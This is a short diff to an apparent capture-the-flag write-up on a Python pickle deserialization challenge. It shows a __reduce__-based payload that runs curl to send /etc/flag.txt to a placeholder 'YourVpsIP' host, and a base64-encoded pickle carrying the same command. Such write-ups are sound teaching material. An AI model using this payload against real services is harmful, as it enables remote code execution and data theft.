@@ -13,7 +13,7 @@ we try to generate an id and download it and BINGO the filename is pickle_shinob
 ![WEB](https://imgur.com/usG1M4H.png)
 
 Now we will use the famous pickle magic function __REDUCE__ and import os library then execute this simple command
-> curl YourVpsIP/?a=`cat /etc/flag.txt`
+> curl YourVpsIP/?a=\`cat /etc/flag.txt\`
 
 Final Payload to Upload (Base64 encoded) :
 > Y3Bvc2l4CnN5c3RlbQpwMAooUydjdXJsIFlvdXJWcHNJUC8/YT1gY2F0IC9ldGMvZmxhZy50eHRgJwpwMQp0cDIKUnAzCi4=
